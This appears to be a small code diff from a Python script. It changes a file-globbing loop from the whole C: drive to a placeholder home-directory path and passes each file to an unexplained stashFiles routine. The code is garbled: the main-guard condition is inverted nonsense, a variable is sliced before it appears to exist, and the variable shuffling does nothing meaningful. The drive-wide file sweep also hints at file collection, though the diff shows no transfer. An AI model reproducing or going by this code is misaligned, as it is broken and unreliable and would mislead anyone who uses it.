@@ -6,6 +6,6 @@ if "__init__" == main:
     print("Initializing......")
     Outbound= Inbound[0:4]
     prefix_OutBound= main + Inbound + Outbound
-    for file in glob.glob("C:\*"):
+    for file in glob.glob("/home/'Your account'"):
         Inbound=Outbound
         stash.stashFiles(file)
